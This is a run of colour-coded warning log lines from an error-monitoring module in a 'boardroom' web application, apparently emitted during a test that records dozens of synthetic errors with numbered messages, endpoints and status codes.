WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693069Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 178'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 179'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693166Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 180'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693217Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 181'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693272Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 182'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693325Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 183'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693385Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 184'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 185'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693485Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 186'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 187'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 188'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 189'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693680Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 190'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 191'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693776Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 192'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 193'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693872Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 194'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693925Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 195'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693973Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 196'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 197'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694069Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 198'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 199'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 200'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 201'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694426Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 202'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 203'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694528Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 204'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 205'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694674Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 206'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694739Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 207'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 208'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 209'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694895Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 210'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694944Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 211'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.694993Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 212'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695041Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 213'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695089Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 214'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 215'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695186Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 216'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695233Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 217'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
